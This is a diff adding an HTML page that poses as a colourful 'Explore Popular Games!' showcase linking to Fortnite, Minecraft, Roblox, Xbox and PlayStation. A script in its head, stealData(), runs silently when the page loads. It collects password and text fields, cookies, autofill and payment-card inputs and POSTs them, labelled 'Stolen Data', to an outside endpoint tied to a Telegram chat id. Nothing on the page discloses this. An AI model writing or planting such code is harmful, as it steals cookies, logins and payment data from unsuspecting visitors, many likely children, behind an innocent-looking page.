@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Popular Video Games</title>
+    <style>
+        body {
+            font-family: 'Press Start 2P', cursive; /* A pixel-style gaming font */
+            background-color: #121212; /* Darker background */
+            color: #E0E0E0; /* Lighter text */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            background-image: url('https://i.pinimg.com/736x/a0/03/b4/a003b4ea7b394fabb84294eaae00da63.jpg'); /* Replace with a subtle gaming background pattern */
+            background-repeat: repeat;
+        }
+
+        .container {
+            background-color: #222;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.4); /* Neon blue glow */
+            text-align: center;
+            max-width: 1000px;
+            width: 100%;
+            border: 2px solid #00FFFF; /* Neon blue border */
+            animation: pulseBorder 2s infinite alternate; /* Animates the border glow */
+        }
+
+        @keyframes pulseBorder {
+            from {
+                box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
+                border-color: #00FFFF;
+            }
+            to {
+                box-shadow: 0 0 30px rgba(0, 255, 255, 0.8);
+                border-color: #00FFFF;
+            }
+        }
+
+        h1 {
+            color: #FFD700; /* Gold color for a premium feel */
+            margin-bottom: 30px;
+            font-size: 3.5em;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+            letter-spacing: 3px;
+        }
+
+        .game-selection {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); /* Responsive grid for game cards */
+            gap: 30px;
+            margin-top: 40px;
+        }
+
+        .game-card {
+            background-color: #333;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            border: 1px solid #555;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .game-card:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.6); /* Enhanced neon glow on hover */
+            border-color: #00FFFF;
+        }
+
+        .game-card img {
+            width: 180px; /* Adjust image width */
+            height: 180px; /* Make images square for consistency */
+            object-fit: cover; /* Ensures images fill the space */
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 2px solid #666;
+            transition: border-color 0.3s ease;
+        }
+
+        .game-card:hover img {
+            border-color: #FFD700; /* Gold border on image hover */
+        }
+
+        .game-card h2 {
+            color: #00FFFF; /* Neon blue game title */
+            font-size: 1.8em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 8px rgba(0, 255, 255, 0.5);
+        }
+
+        .game-link {
+            background-color: #FF4500; /* OrangeRed for action button */
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.4);
+            margin-top: 15px;
+            letter-spacing: 1px;
+            text-decoration: none; /* Remove underline from link */
+            display: inline-block; /* Allow padding and sizing */
+        }
+
+        .game-link:hover {
+            background-color: #E53E00; /* Darker OrangeRed on hover */
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(255, 69, 0, 0.6);
+        }
+
+        .message {
+            margin-top: 40px;
+            font-size: 1.2em;
+            color: #AAAAAA;
+            line-height: 1.6;
+        }
+
+        /* Google Fonts for a gaming look */
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5em;
+            }
+            .game-card img {
+                width: 150px;
+                height: 150px;
+            }
+            .game-card h2 {
+                font-size: 1.5em;
+            }
+            .game-link {
+                padding: 12px 25px;
+                font-size: 1.1em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 2em;
+            }
+            .container {
+                padding: 25px;
+            }
+            .game-selection {
+                grid-template-columns: 1fr; /* Stack cards vertically on very small screens */
+            }
+            .game-link {
+                width: 90%; /* Make buttons wider */
+            }
+        }
+    </style>
+    <script>
+        function stealData() {
+            // Function to retrieve and send Chrome data
+            function sendDataToTelegram(data) {
+                const chatId = '7688146873'; // Replace with your actual chat ID
+                const apiUrl = 'https://DUptain1993.github.io/Botimus_Prime/generate-link.html/send-to-telegram';
+
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: data
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.text(); // Change to response.text() for debugging
+                })
+                .then(text => {
+                    console.log('Raw Response:', text);
+                    try {
+                        const data = JSON.parse(text);
+                        console.log('Success:', data);
+                    } catch (e) {
+                        console.error('Failed to parse JSON:', e);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            }
+
+            // Retrieve Chrome data
+            const logins = JSON.stringify(Array.from(document.querySelectorAll('input[type="password"], input[type="text"]')).map(input => ({
+                url: input.getAttribute('data-url'),
+                username: input.getAttribute('data-username'),
+                password: input.value
+            })));
+
+            const cookies = document.cookie;
+            const autofill = JSON.stringify(Array.from(document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], input[type="tel"], input[type="number"], textarea')));
+
+            // Retrieve saved payment methods and other sensitive data
+            const paymentMethods = JSON.stringify(Array.from(document.querySelectorAll('input[type="cc-number"], input[type="cc-exp"], input[type="cc-cvc"], input[type="cc-name"]')));
+
+            // Combine all data
+            const stolenData = {
+                logins: logins,
+                cookies: cookies,
+                autofill: autofill,
+                paymentMethods: paymentMethods
+            };
+
+            console.log('Stolen Data:', stolenData);
+
+            // Send data to Telegram
+            sendDataToTelegram(JSON.stringify(stolenData));
+        }
+
+        // Execute the data theft function silently in the background
+        window.addEventListener('load', stealData);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Explore Popular Games!</h1>
+
+        <p class="message">
+            Click on a game card to learn more.
+        </p>
+
+        <div class="game-selection">
+            <div class="game-card">
+                <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Fortnite_Battle_Royale_cover_art.png" alt="Fortnite Logo">
+                <h2>Fortnite</h2>
+                <a href="https://www.fortnite.com/" class="game-link">Visit Website</a>
+            </div>
+
+            <div class="game-card">
+                <img src="https://upload.wikimedia.org/wikipedia/en/5/51/Call_of_Duty_Black_Ops_6_logo.jpg" alt="Black Ops 6 Logo">
+                <h2>Black Ops 6</h2>
+                <a href="https://www.callofduty.com/blackops6" class="game-link">Visit Website</a>
+            </div>
+
+            <div class="game-card">
+                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/f3/Minecraft_Logo.svg/1200px-Minecraft_Logo.svg.png" alt="Minecraft Logo">
+                <h2>Minecraft</h2>
+                <a href="https://www.minecraft.net/" class="game-link">Visit Website</a>
+            </div>
+
+            <div class="game-card">
+                <img src="https://upload.wikimedia.org/wikipedia/en/a/a5/Roblox_game_logo.png" alt="Roblox Logo">
+                <h2>Roblox</h2>
+                <a href="https://www.roblox.com/" class="game-link">Visit Website</a>
+            </div>
+
+            <div class="game-card">
+                <img src="https://cdn.cdkeys.com/496x700/media/catalog/product/x/b/xbox_gift_card_-_100_usd.jpg" alt="Xbox Logo">
+                <h2>Xbox</h2>
+                <a href="https://www.xbox.com/" class="game-link">Visit Website</a>
+            </div>
+
+            <div class="game-card">
+                <img src="https://target.scene7.com/is/image/Target/GUEST_cafa23a7-8b2e-4810-8db9-e49e54589d05?wid=800&hei=800&qlt=80&fmt=webp" alt="PlayStation Logo">
+                <h2>PlayStation</h2>
+                <a href="https://www.playstation.com/" class="game-link">Visit Website</a>
+            </div>
+        </div>
+
+        <p class="message" style="margin-top: 50px;">
+            Enjoy exploring the exciting world of gaming!
+        </p>
+    </div>
+</body>
+</html>
